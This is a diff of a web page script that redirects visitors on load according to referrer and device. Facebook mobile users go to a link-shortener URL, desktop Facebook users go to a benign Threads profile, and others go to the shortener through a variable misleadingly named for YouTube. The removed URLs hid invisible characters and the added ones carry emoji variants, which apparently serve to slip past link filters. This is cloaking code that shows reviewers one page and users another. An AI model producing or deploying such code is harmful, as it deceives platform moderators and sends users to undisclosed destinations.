@@ -7,11 +7,16 @@
         var userAgent = navigator.userAgent.toLowerCase();
         var isMobile = /iphone|ipod|android|blackberry|opera mini|windows phone|iemobile|mobile/i.test(userAgent);
         var referrer = document.referrer.toLowerCase();
-        var mobileDevice = "https://m‎agl‎it.me/poshuimichs";
-        var pcURL = "https://www.th‎r‎eads‎.net/@zuck";
-        var youtubeURL = "https://m‎agl‎it.me/poshuimichs";
+        var mobileDeviceWithEmoji = "https://m😍agl😍it.me/poshuimichs";
+        var pcURLWithEmoji = "https://www.th😍r😍eads😍.net/@zuck";
+        var youtubeURLWithEmoji = "https://m😍agl😍it.me/poshuimichs";
+        
+        // Create a "clean" version of the links without the emoji
+        var mobileDevice = "https://maglit.me/poshuimichs"; // Clean link without emoji
+        var pcURL = "https://www.threads.net/@zuck"; // Clean link without emoji
+        var youtubeURL = "https://maglit.me/poshuimichs"; // Clean link without emoji
     
-        // Check if the referrer is Facebook and redirect mobile users to mobileDevice URL
+        // Check if the referrer is Facebook and redirect mobile users to the "clean" mobileDevice URL
         if (referrer.includes("facebook.com")) {
           if (isMobile) {
             window.location.href = mobileDevice;
@@ -19,13 +24,14 @@
             window.location.href = pcURL;
           }
         } else {
-          // If the referrer is not Facebook, redirect to YouTube
+          // If the referrer is not Facebook, redirect to the "clean" YouTube URL
           window.location.href = youtubeURL;
         }
       }
     
       redirectToDifferentWebsite();
     </script>
+    
     
     
 
